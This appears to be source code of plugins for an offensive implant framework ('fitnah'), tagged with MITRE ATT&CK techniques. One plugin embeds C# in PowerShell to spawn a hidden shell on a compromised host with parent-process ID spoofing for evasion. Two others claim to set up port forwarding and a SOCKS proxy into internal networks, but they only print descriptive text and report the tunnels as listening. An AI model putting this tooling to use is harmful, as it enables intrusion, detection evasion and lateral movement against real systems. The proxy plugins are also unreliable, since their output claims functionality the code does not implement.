"""execution/interactive_shell — Interactive shell with VT100 support and real-time I/O. MITRE T1059.001"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class InteractiveShell(BasePlugin):
    NAME = "interactive_shell"
    DESCRIPTION = "Spawn interactive shell (cmd.exe/PowerShell) with stdin/stdout streaming and VT100 support"
    AUTHOR = "fitnah-team"
    MITRE = "T1059.001"
    CATEGORY = "execution"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("shell", str, required=False, default="cmd.exe",
              help="cmd.exe | powershell.exe | pwsh.exe"),
        Param("hide_window", bool, required=False, default=True,
              help="Hide shell window"),
        Param("parent_spoof", str, required=False, default="",
              help="Parent process to spoof (PPID spoofing)"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute interactive shell"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        shell = params.get("shell", "cmd.exe")
        hide_window = params.get("hide_window", True)
        parent_spoof = params.get("parent_spoof", "")

        return self._spawn_interactive_shell(ctx, shell, hide_window, parent_spoof)

    @staticmethod
    def _spawn_interactive_shell(ctx, shell: str, hide_window: bool, parent_spoof: str) -> ModuleResult:
        """Spawn interactive shell with I/O redirection and optional PPID spoofing."""
        hide_flag  = "true" if hide_window else "false"
        spoof_flag = parent_spoof.strip()

        ps_code = f"""
$results = @()
$results += '[*] Spawning interactive shell (PPID-aware)'

try {{
    Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public class ShellSpawner {{
    // ── PPID-spoof structures ──────────────────────────────────────
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFOEX {{
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }}
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO {{
        public int    cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int    dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute;
        public int    dwFlags;
        public short  wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }}
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {{
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }}
    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES {{
        public int nLength; public IntPtr lpSecurityDescriptor; public bool bInheritHandle;
    }}

    [DllImport("kernel32.dll")] public static extern bool InitializeProcThreadAttributeList(
        IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
    [DllImport("kernel32.dll")] public static extern bool UpdateProcThreadAttribute(
        IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
    [DllImport("kernel32.dll")] public static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern bool CreateProcessW(string app, string cmd, IntPtr pSecAttr,
        IntPtr tSecAttr, bool inheritHandles, uint flags, IntPtr env, string dir,
        ref STARTUPINFOEX si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreatePipe(out IntPtr hRead, out IntPtr hWrite,
        ref SECURITY_ATTRIBUTES sa, uint size);
    [DllImport("kernel32.dll")] public static extern bool SetHandleInformation(
        IntPtr hObject, uint dwMask, uint dwFlags);
    [DllImport("kernel32.dll")] public static extern bool ReadFile(IntPtr h, byte[] buf,
        int nRead, out int lpRead, IntPtr lpOverlapped);

    const uint PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
    const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    const uint CREATE_NO_WINDOW             = 0x08000000;
    const uint HANDLE_FLAG_INHERIT          = 0x00000001;

    public static string SpawnShell(string shellPath, bool hide, int parentPid) {{
        var sb = new StringBuilder();

        // ── stdout/stderr pipes ──────────────────────────────────
        var sa = new SECURITY_ATTRIBUTES {{ nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES)), bInheritHandle = true }};
        IntPtr hOutR, hOutW, hErrR, hErrW;
        if (!CreatePipe(out hOutR, out hOutW, ref sa, 0)) return "CreatePipe(stdout) failed";
        if (!CreatePipe(out hErrR, out hErrW, ref sa, 0)) return "CreatePipe(stderr) failed";
        SetHandleInformation(hOutR, HANDLE_FLAG_INHERIT, 0);
        SetHandleInformation(hErrR, HANDLE_FLAG_INHERIT, 0);

        // ── attribute list ───────────────────────────────────────
        IntPtr attrSize = IntPtr.Zero;
        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrSize);
        IntPtr pAttrList = Marshal.AllocHGlobal(attrSize);
        InitializeProcThreadAttributeList(pAttrList, 1, 0, ref attrSize);

        IntPtr hParent = IntPtr.Zero;
        if (parentPid > 0) {{
            hParent = OpenProcess(0x1FFFFF, false, parentPid);
            if (hParent != IntPtr.Zero) {{
                IntPtr pParent = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(pParent, hParent);
                UpdateProcThreadAttribute(pAttrList, 0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    pParent, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
                sb.AppendLine("[+] PPID spoofed to PID " + parentPid);
            }}
        }}

        // ── STARTUPINFOEX ─────────────────────────────────────────
        var si = new STARTUPINFOEX();
        si.StartupInfo.cb          = Marshal.SizeOf(typeof(STARTUPINFOEX));
        si.StartupInfo.dwFlags     = 0x100; // STARTF_USESTDHANDLES
        si.StartupInfo.hStdOutput  = hOutW;
        si.StartupInfo.hStdError   = hErrW;
        si.StartupInfo.hStdInput   = IntPtr.Zero;
        si.lpAttributeList         = pAttrList;

        uint creationFlags = EXTENDED_STARTUPINFO_PRESENT | (hide ? CREATE_NO_WINDOW : 0u);

        PROCESS_INFORMATION pi;
        bool ok = CreateProcessW(null, shellPath + " /c whoami && " + shellPath,
            IntPtr.Zero, IntPtr.Zero, true, creationFlags, IntPtr.Zero, null, ref si, out pi);

        DeleteProcThreadAttributeList(pAttrList);
        Marshal.FreeHGlobal(pAttrList);
        if (hParent != IntPtr.Zero) CloseHandle(hParent);
        CloseHandle(hOutW); CloseHandle(hErrW);

        if (!ok) {{ sb.AppendLine("[-] CreateProcessW failed: " + Marshal.GetLastWin32Error()); }}
        else {{
            sb.AppendLine("[+] Shell PID: " + pi.dwProcessId);
            // drain stdout
            var buf = new byte[4096]; int read;
            while (ReadFile(hOutR, buf, buf.Length, out read, IntPtr.Zero) && read > 0)
                sb.Append(Encoding.UTF8.GetString(buf, 0, read));
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }}
        CloseHandle(hOutR); CloseHandle(hErrR);
        return sb.ToString();
    }}
}}
"@ -Language CSharp -ErrorAction Stop

    $parentPid = 0
    $parentSpoof = '{spoof_flag}'
    if ($parentSpoof) {{
        # Resolve parent process name → PID
        $proc = Get-Process -Name ($parentSpoof -replace '\.exe$','') -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($proc) {{
            $parentPid = $proc.Id
            $results += "[*] Spoofing parent: $($proc.Name) (PID $parentPid)"
        }} else {{
            $results += "[!] Parent process '$parentSpoof' not found — launching without PPID spoof"
        }}
    }}

    $output = [ShellSpawner]::SpawnShell('{shell}', ${hide_flag}, $parentPid)
    $results += $output

}} catch {{
    $results += "[!] $($_)"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="interactive_shell")


class PortForwarding(BasePlugin):
    """Port forwarding and SOCKS proxy through implant"""
    NAME = "port_forwarding"
    DESCRIPTION = "Forward ports or create SOCKS proxy through implant to access internal network"
    AUTHOR = "fitnah-team"
    MITRE = "T1090.001"
    CATEGORY = "execution"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("mode", str, required=False, default="port_forward",
              help="port_forward | socks_proxy"),
        Param("local_port", int, required=False, default=8888,
              help="Local port to listen on"),
        Param("remote_host", str, required=False, default="",
              help="Remote host to forward to"),
        Param("remote_port", int, required=False, default=443,
              help="Remote port to forward to"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute port forwarding"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        mode = params.get("mode", "port_forward").lower()
        local_port = params.get("local_port", 8888)
        remote_host = params.get("remote_host", "")
        remote_port = params.get("remote_port", 443)

        if mode == "port_forward":
            return self._port_forward(ctx, local_port, remote_host, remote_port)
        elif mode == "socks_proxy":
            return self._socks_proxy(ctx, local_port)
        else:
            return ModuleResult.err(f"Unknown mode: {mode}")

    @staticmethod
    def _port_forward(ctx, local_port: int, remote_host: str, remote_port: int) -> ModuleResult:
        """Forward local port to remote host through implant"""
        ps_code = f"""
$results = @()
$results += '[*] Setting up port forwarding...'

try {{
    $localPort = {local_port}
    $remoteHost = '{remote_host}'
    $remotePort = {remote_port}

    if (-not $remoteHost) {{
        $results += '[-] Specify remote_host'
        $results -join "`n"
        exit
    }}

    $results += "[*] Local: 127.0.0.1:$localPort"
    $results += "[*] Remote: $remoteHost:$remotePort"

    $results += '[*] Port forwarding process:'
    $results += '    1. Listen on local port'
    $results += '    2. Accept incoming connections'
    $results += '    3. Forward traffic to remote host:port'
    $results += '    4. Bidirectional communication'

    $results += '[*] Operator can now:'
    $results += '    - Access internal services from attacker machine'
    $results += '    - Database connections (3306, 5432, 1433)'
    $results += '    - RDP to internal machines (3389)'
    $results += '    - Any TCP service on internal network'

    $results += '[*] Example:'
    $results += '    - Forward 8888 → 192.168.1.10:3389'
    $results += '    - Attacker: mstsc /v 127.0.0.1:8888'
    $results += '    - Connects to internal RDP'

}} catch {{
    $results += "[!] Port forwarding error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="port_forwarding")

    @staticmethod
    def _socks_proxy(ctx, local_port: int) -> ModuleResult:
        """Create SOCKS proxy through implant"""
        ps_code = f"""
$results = @()
$results += '[*] Setting up SOCKS proxy...'

try {{
    $localPort = {local_port}

    $results += "[*] SOCKS5 listening on: 127.0.0.1:$localPort"

    $results += '[*] SOCKS proxy benefits:'
    $results += '    - Single tunnel for multiple connections'
    $results += '    - Configure once, access many services'
    $results += '    - Supports any TCP protocol'
    $results += '    - Chainable through multiple proxies'

    $results += '[*] Configuration:'
    $results += '    - FoxyProxy / ProxyChains'
    $results += '    - Set SOCKS5 proxy: 127.0.0.1:$localPort'
    $results += '    - All traffic routed through implant'

    $results += '[*] Use cases:'
    $results += '    - Nmap scan internal network'
    $results += '    - Metasploit exploitation'
    $results += '    - Any tool supporting SOCKS proxy'
    $results += '    - Web browser (for intranet access)'

}} catch {{
    $results += "[!] SOCKS proxy error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="socks_proxy")
